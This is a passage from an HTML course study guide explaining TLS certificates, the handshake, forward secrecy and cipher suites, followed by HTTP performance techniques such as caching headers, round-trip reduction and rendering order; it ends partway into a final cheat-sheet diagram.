          <p>Without TLS, none of these are guaranteed — an attacker sitting anywhere between you and the server (on your Wi-Fi, at an ISP, anywhere along the route) could intercept traffic meant for a legitimate server and simply pretend to <em>be</em> that server, since there's nothing in plain HTTP forcing a cryptographic proof of identity.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Certificates — a cryptographic ID card</summary>
        <div class="topic-body">
          <p>To establish <em>identity</em>, a server presents a <strong>certificate</strong> — think of it like an ID card. It contains the server's domain name (called the "Common Name"), a large number called a <strong>public key</strong>, and a signature. The signature is what makes it trustworthy: it comes from a <strong>Certificate Authority (CA)</strong>, an organization that verified the server's identity ahead of time and vouches for it cryptographically.</p>
          <p>Here's the key insight that makes the whole system work: the CA signs the certificate using their own <em>private</em> key, and anyone can verify that signature using the CA's <em>public</em> key — which your browser and operating system already ship with a pre-installed, trusted list of. If you change even one byte of the certificate (the domain name, the public key, anything), the signature will no longer match, so tampering is immediately detectable.</p>
          <div class="callout warn"><span class="callout-label">Where the trust chain can actually break</span>
          <p>This whole system rests on trusting the CA — so what happens if that trust is misplaced? A few real failure modes: you might not actually have the CA's genuine public key to check against; the CA itself could be compromised or malicious; the CA's private key could leak, letting anyone forge valid-looking certificates; or the site simply never got a real CA signature at all.</p>
          <p>Browser makers defend against these with several overlapping mechanisms: only trusting a curated list of vetted CAs, actively removing CAs that turn out to be compromised, refusing to load sites with invalid signatures, cross-checking certificates against public <strong>Certificate Transparency</strong> logs (to catch a CA that secretly issued a second, fraudulent certificate for a domain), consulting <strong>CRLs</strong> (Certificate Revocation Lists) for certificates known to be compromised, and <strong>HPKP</strong>-style key pinning (remembering a site's public key from a previous visit and flagging a mismatch later).</p>
          </div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The handshake — step by step</summary>
        <div class="topic-body">
          <div class="diagram">
            <div class="mermaid">
sequenceDiagram
    participant C as Client
    participant S as Server
    Note over C,S: 1. A regular TCP handshake happens first
    C->>S: 2. "Client Hello" — TLS version, supported ciphers, SNI (which domain)
    S-->>C: 3. "Server Hello" — chosen cipher + its Certificate
    Note over C: 4. Client verifies the certificate against a trusted CA
    C->>S: 5. Both sides agree on an encryption key<br/>(often via a Diffie-Hellman exchange)
    C->>S: 6. Encrypted "ready"
    S-->>C: 7. Encrypted "ready"
    Note over C,S: All further application traffic is now encrypted
            </div>
          </div>
          <p>Step 2 includes something worth calling out specifically: <strong>SNI</strong> (Server Name Indication), the TLS-layer equivalent of HTTP's <code>Host:</code> header. Since many different websites often share the same physical server and IP address, the client needs to tell the server <em>which</em> site's certificate to present before any encryption is even set up — SNI is how it does that, sent openly as part of the initial handshake (before encryption kicks in).</p>
          <p>Step 5's key agreement is often done via a <strong>Diffie-Hellman exchange</strong> — a clever piece of math that lets both sides compute the exact same shared secret key by exchanging seemingly unrelated public values, in a way that an eavesdropper watching the entire exchange still can't reconstruct the final shared key themselves.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Perfect Forward Secrecy — protecting the past, not just the present</summary>
        <div class="topic-body">
          <p>Older TLS designs derived session keys in a way that, if the server's long-term private key was ever later stolen, an attacker who had been quietly recording <em>old</em> encrypted traffic could go back and decrypt all of it retroactively. <strong>Perfect Forward Secrecy</strong> fixes this by using a <em>temporary</em> ("ephemeral") Diffie-Hellman key for each individual session, one that's discarded afterward and never derivable from the server's long-term key. The practical result: even if the server's main private key leaks years later, every past conversation that used forward secrecy stays permanently unreadable.</p>
          <p>There's also a latency benefit worth noting: traditional TLS costs at least 2 extra round trips on top of the underlying TCP handshake; newer TLS versions have reduced this to a single round trip.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Cipher suites — reading the alphabet soup</summary>
        <div class="topic-body">
          <p>A cipher suite name looks intimidating but is really just several separate algorithm choices, packed into one string, all negotiated together during the handshake:</p>
          <pre><code>TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256</code></pre>
          <ul>
            <li><strong>ECDHE</strong> — the key exchange method (an elliptic-curve variant of Diffie-Hellman, "E" for ephemeral — this is what provides Perfect Forward Secrecy)</li>
            <li><strong>ECDSA</strong> — the signature algorithm proving the server's identity</li>
            <li><strong>CHACHA20</strong> — the actual encryption algorithm scrambling your data</li>
            <li><strong>POLY1305</strong> — checks the authenticity/integrity of most messages</li>
            <li><strong>SHA256</strong> — checks authenticity of some other parts of the handshake</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>TLS has a long history of real vulnerabilities</summary>
        <div class="topic-body">
          <p>TLS's history includes a long list of named, real-world vulnerabilities — Heartbleed, POODLE, BEAST, CRIME, BREACH, FREAK, Logjam, DROWN, and more. This isn't a reason to distrust TLS itself (the underlying cryptography is sound) — it's a reason to take patching and configuration seriously. Two practical takeaways the course notes stress:</p>
          <ul>
            <li><strong>TLS everything</strong>, not just your login page. If only the login form is served over HTTPS, an attacker positioned in the middle can simply intercept and rewrite the unencrypted parts of your site to replace the "secure" login link with their own insecure one — partial HTTPS provides a false sense of security.</li>
            <li><strong>Keep software up to date</strong> on both ends of a connection — even one outdated client using weak, deprecated cryptography can be exploited to leak information that should have been protected.</li>
          </ul>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch10" data-target="ch10">← Security</a><a class="footer-nav-btn" href="#ch12" data-target="ch12">Next: HTTP Performance →</a></div>
    </section>

    <section class="chapter" id="ch12">
      <div class="chapter-head"><span class="chapter-num">12</span><h2>HTTP Performance</h2></div>
      <p class="chapter-intro">Performance is what's called a "non-functional requirement" — your site can be functionally perfect and still fail users if it's slow. This chapter is a toolbox of concrete techniques, all built around one underlying idea: locality.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>Measure before you optimize</summary>
        <div class="topic-body">
          <p>Performance work has a real discipline behind it, and skipping straight to "optimizing" without measurement is a classic mistake. The proper process: measure something concrete first, record that baseline, make one change, and re-measure — running the test multiple times to get a real sample rather than trusting a single lucky (or unlucky) run. Because you're comparing numbers that naturally have some noise/variance, a statistically sound comparison (like a t-test) is what tells you whether an improvement is <em>real</em>, or just random variation you got lucky with.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Caching — the single biggest lever you have</summary>
        <div class="topic-body">
          <p>Caching works by increasing <strong>locality</strong> — keeping a copy of data physically or logically closer to where it's needed, so you don't have to re-fetch it across a slow network every time. There's a whole hierarchy of caching layers, roughly ordered fastest-to-slowest: CPU cache → memory → disk → network. Every step further down that list is dramatically slower than the one above it — which is exactly why avoiding a network round trip altogether (by serving from a local cache) is usually the single highest-leverage performance change you can make.</p>
          <table>
            <tr><th>Header</th><th>What it does</th></tr>
            <tr><td><code>Cache-Control: max-age=N</code></td><td>Cache for N seconds — the easiest option to deploy correctly, no date arithmetic required</td></tr>
            <tr><td><code>Cache-Control: no-cache</code></td><td>Must revalidate with the server before using a cached copy (a <code>304</code> response confirming "still valid" is fine, and cheap)</td></tr>
            <tr><td><code>Cache-Control: no-store</code></td><td>Don't cache this at all, anywhere</td></tr>
            <tr><td><code>Expires</code></td><td>Cache until a specific date/time — simple, but easy to misconfigure (set it too far out, and you're stuck serving stale content)</td></tr>
            <tr><td><code>Last-Modified</code> + <code>If-Modified-Since</code></td><td>A conditional GET — the server can reply <code>304 Not Modified</code> (with an empty body) if the content hasn't changed since the client's cached copy</td></tr>
            <tr><td><code>ETag</code> + <code>If-None-Match</code></td><td>A content fingerprint/version tag — useful when you can't reason cleanly about <em>time</em>, but you can compute a hash of the exact content</td></tr>
          </table>
          <p><strong>ETag vs. Last-Modified — when to reach for which:</strong> use <code>Last-Modified</code> when you can reliably answer "when did this last change?" — it's simple and requires no extra computation. Reach for <code>ETag</code> instead when content changes unpredictably, or when you specifically need to detect if the content is <em>exactly</em> the same (not just "modified around the same time") — for example, hashing the actual content with SHA-1 gives you a fingerprint that only changes if the bytes themselves actually changed.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Round trips are the enemy</summary>
        <div class="topic-body">
          <div class="diagram">
            <div class="mermaid">
flowchart LR
    A[DNS Lookup] --> B[TCP Handshake] --> C[TLS Handshake, if HTTPS] --> D[Actual HTTP Request/Response]
            </div>
          </div>
          <p>Notice that the actual HTTP exchange is only the <em>last</em> step — by the time your request even reaches the server, you may have already paid for a DNS lookup, a TCP handshake, and (for HTTPS) a full TLS handshake, each one its own separate round trip across the network. And round trips are fundamentally <strong>synchronous</strong> — you can't skip ahead, you have to wait for each one to complete before the next can begin, which is precisely what makes them so costly compared to work that can happen asynchronously or in parallel.</p>
          <p>Practical ways to cut down on round trips: avoid unnecessary redirects (each one is a full extra request/response cycle); bundle resources together (one CSS file instead of ten, "CSS sprites" combining many small images into one file instead of many separate image requests); and use a <strong>CDN</strong> (Content Delivery Network) to physically shorten the distance — and therefore the latency — between the user and wherever the content is served from.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Reduce payload size</summary>
        <div class="topic-body">
          <p>Beyond reducing the <em>number</em> of round trips, you can reduce how much data each one has to carry: compress text-based content with <strong>GZIP</strong>, minify JavaScript and CSS (stripping whitespace/comments), and avoid sending oversized images, audio, or video where a smaller version would do. Picking the right <em>encoding</em> for the data matters too — sending an audio stream encoded as plain ASCII text, for instance, would be a wildly inefficient choice compared to an appropriate binary audio format.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Rendering-order tips</summary>
        <div class="topic-body">
          <p>Where you place resources in the page actually affects how quickly it feels usable to a real person. The general recommendation: put <strong>CSS near the top</strong> of the page, so styling information is available before the browser starts painting content (avoiding an ugly "flash of unstyled content"); put <strong>JavaScript near the bottom</strong> (or load it with <code>defer</code>), so it doesn't block the browser from rendering the visible content while it downloads and executes. Giving images explicit width and height attributes also matters more than it might seem — without them, the browser has to guess, then reflow the whole layout once the real image dimensions are known, which causes visible content-jumping as the page loads.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Avoid POST for reads — a REST/performance crossover point</summary>
        <div class="topic-body">
          <p>This connects directly back to Chapter 7: <code>POST</code> is <strong>not idempotent</strong> and <strong>not cacheable</strong> by default. Using it for a read-only operation (just because it "feels more secure" or can carry a bigger payload) silently throws away every bit of HTTP's built-in caching infrastructure that a <code>GET</code> would have gotten you for free. If you're just reading data, use <code>GET</code>.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Even errors cost performance</summary>
        <div class="topic-body">
          <p>It's easy to assume error responses (404, 403, 410) are "cheap" since there's less content to send — but the course notes point out the opposite is often true: generating an error frequently costs the server <em>more</em> work than serving a normal successful response, because it typically triggers exception handling, extra logging, and sometimes retries — all of which consume real server resources for essentially no value delivered to the user. Keeping broken links and unnecessary error paths cleaned up is a genuine performance concern, not just a cosmetic one.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Performance is a "cross-cutting concern"</summary>
        <div class="topic-body">
          <p>Performance doesn't live in its own isolated box — it constantly interacts with the security and state decisions covered in earlier chapters, which is exactly why it's called a <strong>cross-cutting concern</strong>. A few concrete examples of that interaction: skipping encryption for speed means your traffic can be read (or tampered with) by any proxy along the way; adding authentication almost always limits how aggressively a response can be cached (since the "correct" response can now depend on <em>who's</em> asking); and any server-side state you introduce tends to also limit how requests can be layered and load-balanced, since now a specific server has to "remember" something about a specific client.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Round-trip tricks worth knowing by name</summary>
        <div class="topic-body">
          <p>A few specific, nameable techniques the course notes call out for cutting down round-trip overhead:</p>
          <ul>
            <li><strong>Multiple static hostnames</strong> — deliberately serving static assets (images, CSS) from a few different subdomains. It costs you an extra DNS lookup up front, but browsers cap how many simultaneous connections they'll open to any <em>one</em> hostname, so spreading assets across a couple of hostnames lets more of them download in parallel.</li>
            <li><strong>Fix DNS</strong> — prefer direct <code>A</code>/<code>AAAA</code> records over chains of <code>CNAME</code>s where you can (each hop in a CNAME chain is an extra lookup); let DNS responses be cached rather than forcing a fresh lookup constantly; and keep the number of distinct hosts referenced on one page low, since each new host means a new DNS lookup and a new connection to set up.</li>
            <li><strong>Avoid indirection</strong> — every redirect, every "import this from over there," every dynamically-chosen piece of content is one more round trip standing between the user and the thing they actually asked for. Minimize the chain between a request and its final answer.</li>
            <li><strong>Avoid POST where GET would do</strong> — this is worth repeating from earlier in this chapter because it's easy to reach for POST out of habit: POST is not cacheable and not idempotent, so it forfeits the caching benefits GET gets automatically.</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Denormalizing data, and the cost of relying on someone else's CDN library</summary>
        <div class="topic-body">
          <p>Caching is about <em>avoiding</em> repeating yourself over the network — but sometimes the opposite move, deliberately <strong>denormalizing</strong> (duplicating) data, actually reduces total requests, because the client no longer has to make a second request just to "join" two pieces of related data together. It's a genuine tradeoff, not a universal rule: more duplication trades storage and consistency complexity for fewer round trips.</p>
          <p>One specific, commonly-debated decision: should you load a common JavaScript library (jQuery, a UI framework) from a third party's public CDN, or host it yourself? Loading from a big public CDN has a real upside — if the user has already visited another site using the exact same CDN URL, their browser may already have it cached, costing you nothing. But it comes with real downsides too: you're now trusting that third party's infrastructure not to be compromised or hacked, you have no control over whether their servers are as fast as your own, and you lose some of the caching-locality benefits you'd get from serving everything from infrastructure you control.</p>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch11" data-target="ch11">← TLS</a><a class="footer-nav-btn" href="#cheat" data-target="cheat">Next: Cheat Sheet →</a></div>
    </section>

    <section class="chapter" id="cheat">
      <div class="chapter-head"><span class="chapter-num">＋</span><h2>Final Exam &amp; Interview Cheat Sheet</h2></div>
      <p class="chapter-intro">Once you've genuinely read the chapters above, this section is for rapid recall — not for learning something for the first time.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>The whole course, in one diagram</summary>
        <div class="topic-body">
          <div class="diagram">
            <div class="mermaid">
flowchart TD
    subgraph Network["01 · Network Layers"]
        L1["Link (Ethernet)"] --> L2["Internet (IPv4/IPv6)"] --> L3["Transport (TCP/UDP)"] --> L4["Application (HTTP, DNS)"]
    end
    subgraph WebLayer["02-03 · The Web"]
        HTTP["HTTP Request/Response"] --> HTML["HTML rendered by the browser"] --> CSS["styled by CSS"]
    end
    subgraph Dynamic["04-06 · Making it Interactive"]
        JS["JavaScript"] --> AJAX["AJAX — async HTTP via JS"]
        JS --> WS["WebSockets — persistent two-way"]
    end
    subgraph Arch["07-08 · Architecture"]
        REST["REST APIs — nouns + verbs"] --> Mining["Web Mining — scraping/APIs"]
